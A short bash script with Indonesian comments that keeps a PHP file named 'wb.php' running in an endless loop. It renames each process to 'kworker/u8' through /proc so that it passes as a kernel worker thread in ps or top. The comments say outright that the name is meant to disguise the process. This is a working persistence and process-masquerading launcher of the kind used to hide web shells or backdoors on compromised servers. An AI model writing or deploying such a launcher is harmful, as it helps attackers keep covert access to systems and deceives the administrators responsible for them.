#!/bin/bash

# Nama proses log untuk disamarkan
PROCESS_NAME="kworker/u8"

# Lokasi skrip PHP
SCRIPT="wb.php"

# Fungsi utama: menjalankan loop agar skrip selalu hidup
while true; do
  php "$SCRIPT" > /dev/null 2>&1 &
  PID=$!

  # Ganti nama proses di /proc (hanya akan terlihat di ps atau top)
  echo -n "$PROCESS_NAME" > /proc/$PID/comm 2>/dev/null

  # Tunggu proses selesai
  wait $PID
  sleep 1
done
